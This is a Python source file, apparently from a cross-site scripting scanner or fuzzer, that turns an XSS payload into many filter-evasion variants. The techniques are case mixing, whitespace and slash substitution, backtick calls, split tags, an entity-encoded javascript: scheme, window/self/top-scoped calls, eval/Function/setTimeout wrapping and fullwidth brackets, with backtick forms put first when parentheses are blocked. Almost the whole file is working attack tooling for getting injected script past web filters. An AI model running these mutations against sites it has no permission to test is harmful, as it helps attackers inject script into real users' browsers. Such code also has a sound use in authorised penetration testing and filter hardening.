from __future__ import annotations

import re

TAG_RE = re.compile(r"<\s*([A-Za-z][A-Za-z0-9]*)")
_CALL_RE = re.compile(r"\b(alert|confirm|prompt)\s*\(")


def _case_mix(s):
    out = []
    upper = True
    for ch in s:
        if ch.isalpha():
            out.append(ch.upper() if upper else ch.lower())
            upper = not upper
        else:
            out.append(ch)
    return "".join(out)


def _spaces_to_slash(s):
    return re.sub(r"<([A-Za-z][A-Za-z0-9]*)\s+", lambda m: "<" + m.group(1) + "/", s, count=1)


def _space_variants(s):
    out = []
    for sep in ("\t", "\x0c", "\n", "/"):
        if " " in s:
            out.append(s.replace(" ", sep, 1))
    return out


def _backtick_call(s):
    return re.sub(r"alert\((\d+)\)", r"alert`\1`", s)


def _comment_split_tag(s):
    m = TAG_RE.search(s)
    if not m:
        return None
    name = m.group(1)
    if len(name) < 2:
        return None
    split = "<" + name[0] + "<" + name + ">" + name[1:]
    return s.replace("<" + name, split, 1)


def _entity_scheme(s):
    if "javascript:" not in s.lower():
        return None
    return re.sub(r"javascript:", "javascript&colon;", s, flags=re.IGNORECASE)


def _scope_calls(s):
    if not _CALL_RE.search(s):
        return []
    out = []
    for scope in ("window.", "self.", "top.", "parent.", "globalThis."):
        out.append(_CALL_RE.sub(lambda m, sc=scope: sc + m.group(1) + "(", s))
    out.append(_CALL_RE.sub(lambda m: m.group(1) + "?.(", s))
    return out


def _fn_wrap(s):
    out = []
    for fn in ("alert", "confirm", "prompt"):
        token = fn + "(1)"
        if token in s:
            out.append(s.replace(token, "eval('%s'+'%s(1)')" % (fn[:2], fn[2:])))
            out.append(s.replace(token, "Function('%s(1)')()" % fn))
            out.append(s.replace(token, "setTimeout('%s(1)',0)" % fn))
    return out


def _fullwidth_brackets(s):
    if "<" not in s or ">" not in s:
        return None
    return s.replace("<", "＜").replace(">", "＞")


def variants(payload, char_map=None):
    out = []
    seen = set()

    def add(v):
        if v and v != payload and v not in seen:
            seen.add(v)
            out.append(v)

    add(_case_mix(payload))
    add(_spaces_to_slash(payload))
    for v in _space_variants(payload):
        add(v)
    add(_backtick_call(payload))
    add(_comment_split_tag(payload))
    add(_entity_scheme(payload))
    for v in _scope_calls(payload):
        add(v)
    for v in _fn_wrap(payload):
        add(v)
    add(_fullwidth_brackets(payload))

    blocked_paren = char_map is not None and not char_map.get("(", True)
    if blocked_paren:
        prioritized = [v for v in out if "`" in v]
        rest = [v for v in out if "`" not in v]
        out = prioritized + rest
    return out
